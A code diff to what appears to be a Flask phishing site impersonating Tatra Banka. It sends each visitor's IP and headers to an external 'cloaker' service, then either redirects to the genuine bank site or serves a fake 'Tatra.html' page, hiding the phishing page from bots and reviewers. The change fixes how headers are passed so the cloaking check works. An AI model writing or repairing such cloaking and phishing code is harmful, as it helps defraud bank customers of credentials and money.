@@ -15,7 +15,7 @@ CLOAKER_URL = os.environ.get('CLOAKER_URL', 'https://cloaker-production-6d6b.up.
 SAFE_URL = os.environ.get('SAFE_URL', 'https://www.tatrabanka.sk')
 BOT_THRESHOLD = int(os.environ.get('BOT_THRESHOLD', '40'))
 
-def check_visitor(ip, user_agent, headers, domain):
+def check_visitor(ip, user_agent, headers_dict, domain):
     """Проверяет посетителя через cloaker и возвращает action"""
     try:
         print(f"[CLOAKER] Checking {ip} for domain {domain} via {CLOAKER_URL}")
@@ -24,7 +24,7 @@ def check_visitor(ip, user_agent, headers, domain):
             json={
                 "ip": ip,
                 "user_agent": user_agent,
-                "headers": {k: v for k, v in headers},
+                "headers": headers_dict,
                 "domain": domain
             },
             timeout=5
@@ -133,7 +133,8 @@ def index():
     user_agent = request.headers.get('User-Agent', '')
     domain = request.host.split(':')[0]
     
-    action, data = check_visitor(ip, user_agent, request.headers, domain)
+    headers_dict = dict(request.headers)
+    action, data = check_visitor(ip, user_agent, headers_dict, domain)
     
     if action == 'bank':
         return render_template('Tatra.html')
